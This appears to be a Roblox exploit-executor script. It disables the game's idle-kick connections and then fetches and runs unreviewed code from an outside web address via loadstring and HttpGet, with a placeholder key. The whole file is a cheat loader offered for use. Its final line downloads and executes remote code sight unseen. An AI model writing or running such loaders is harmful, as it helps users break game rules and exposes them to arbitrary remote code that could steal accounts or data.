-- Anti AFK
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
v:Disable()
end

_G.Key="YourKey"
loadstring(game:HttpGet'http://new.cynical.vip/')()